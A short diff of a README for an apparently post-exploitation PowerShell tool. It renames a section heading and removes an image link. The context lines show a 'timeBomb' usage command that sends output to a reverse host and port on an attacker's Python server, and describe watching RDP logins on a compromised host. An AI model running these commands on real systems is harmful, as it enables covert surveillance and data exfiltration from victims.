@@ -137,7 +137,7 @@ PS> timeBomb -task trigger -at 15:00 -stoptime 16:00 -newest <give a big number>
 PS> timeBomb -task trigger -at 15:00 -stoptime 16:00 -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
 ```
 
-## RDPConn (Valid RDP Connections)
+## Active Remote Desktop Sessions
 
 RDPConn function gets only valid incoming RDP connections into the compromised host. By using this function you will be able to observe which users from which machines have connection with our host without interrupt their connection if we tried to login with the same credentials.
 
@@ -147,7 +147,7 @@ PS> RDPConn
 
 #### Example 1
 
-![alt text](https://github.com/tasox/LogRM/blob/master/timBomb_task_once.png)
+![alt text]()
 
 
 
